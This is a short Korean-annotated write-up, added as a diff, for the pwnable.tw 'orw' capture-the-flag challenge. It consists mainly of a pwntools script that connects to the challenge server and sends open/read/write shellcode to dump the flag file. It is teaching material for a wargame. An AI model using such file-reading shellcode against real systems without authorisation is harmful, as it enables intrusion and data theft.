@@ -1,0 +1,17 @@
+# orw  
+pwnable의 shellcode 사용  
+---
+from pwn import *
+
+#p = process(["./orw"])/문제가 현재 폴더에 있으면 process를 사용해서  
+p = remote("chall.pwnable.tw", 10001)/직접 가져와도 됨  
+context(arch="i386", os="linux")/arch,os입력, 안해도 되지만 shallcraft.(arch).(os).명령어로 길게 작성해야함.  
+
+shellcode = shellcraft.pushstr("/home/orw/flag") /shellcode 생성시 파일명을 push함   
+shellcode += shellcraft.open("esp", 0, 0)/현재 esp가 가리키는 파일명을 읽음  
+shellcode += shellcraft.read("eax", "esp", 100)/eax에 파일의 출력값을 100 만큼 받음
+shellcode += shellcraft.write(1, "esp", 100)/ terminal에 출력
+
+p.sendline(asm(shellcode))/ 위의 입력내용을 asm으로 전달
+p.interactive()/입출력 권한 넘겨줌
+---
